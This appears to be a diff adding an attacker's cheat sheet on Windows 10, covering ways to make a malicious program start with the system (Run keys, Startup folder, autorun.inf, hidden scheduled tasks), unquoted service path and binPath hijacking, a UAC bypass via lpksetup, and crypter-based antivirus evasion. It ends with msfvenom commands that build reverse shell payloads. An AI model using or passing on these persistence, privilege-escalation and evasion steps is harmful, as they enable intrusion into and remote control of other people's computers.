@@ -1,0 +1,89 @@
+Windows 10 Security fault:
+
+[==================================================================
+Launch software at startup with registery key: 
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+===================================================================]
+
+
+[=================================================================================
+Launch software at startup with boot file:
+C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+--> or [Windows] + [R] >> shell:startup
+==================================================================================]
+
+
+[============================================================================================================================
+Launch software at startup with services:
+-If a service use a path to a software and its path is not contained in quotes. (You can see this with process-explorer)
+ For example a services that runs the file program.exe in path C:/Program Files/Users Software/program.exe
+ Windows will look for the program.exe file in C:/program.exe then he try C:/Program Files/program.exe
+ but he doesn't exist, so windows will try C:/Program Files/Users Software/program.exe and it will find the program.
+ Il suffit donc de mettre un fichier program dans le fichier C:/ et windows va exécuter C:/program.exe
+ So just put a malicious program.exe file in path C:/ and Windows will execute the malicious program in path C:/program.exe
+
+-If a service use a oath to a software and its path is conained in quotes. 
+ Just replace program.exe in path "C:/Program Files/Users Software/program.exe" with your malicious program named program.exe
+You can inject a payload with msfvenom instead of a program that runs in admin.
+==============================================================================================================================]
+
+
+[=================================================================================================================
+To bypass antivirus and Human with the crypters:
+In the current state crypters are some of the most effective AV evasion tools
+Understanding encryption https://dione.lib.unipi.gr/xmlui/bitstream/handle/unipi/6233/Tasiopoulos.pdf;jsessionid=654768B42B16CB47F384E8DB3340A7B1?sequence=2
+To bypass antivirus with crypter you can encrypt your malware with a crypter software like the crypter in msfvenom.
+===================================================================================================================]
+
+
+[=================================================================
+Start terminal on bypass User Account Control (UAC) on Windows 10:
+--> [Windows] + [R] >> lpksetup
+--> Install languages 
+--> Browse >> Select a folder where you have write rights
+--> Right click >> Properties
+--> Personalize >> Choose a file
+--> Write "cmd.exe" on file path and press [Enter]
+A command terminal in administrator is then executed.
+===================================================================]
+
+
+[=================================================================================
+Launch software at startup with autorun file: 
+In note pad write:
+--> [autorun]
+--> open=<path of your malicious program> (example: C:\Program Files\Program.exe)
+save it with as name: autorun.inf 
+==================================================================================]
+
+
+[========================================================================================
+Launch software at startup with Task Scheduler (  System Agent ):
+--> schtasks /create /tn MyTask /tr "C:\YourMaliciousProgram.exe" /sc onstart /RL HIGHEST
+/tn to specify the name of task. (use an unrecognizable name) :)
+/tr <Path/Name> to specify which software to run
+/sc onstarts to specify when the task launch.
+/RL HIGHEST to specify the execution privilege.
+==========================================================================================]
+
+
+[=============================================================================
+Software to manage your startup program:
+Autoruns.exe (https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)
+Its a software to manage the programs launching at startup.
+==============================================================================]
+
+
+[=======================================================================
+Changing the path of a service to execute your malicious program:
+On admin terminal write: sc config <service name> binPath= <binary path>
+========================================================================]
+
+
+[====================================================================================================================
+How to use msfvenom:
+Windows Staged reverse TCP ==> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT>-f exe > <NAME>.exe
+Windows Stageless reverse TCP ==> msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
+Python ==> $ msfvenom -p cmd/unix/reverse_python LHOST="<IP>" LPORT=<PORT> -f raw > shell.py
+======================================================================================================================]
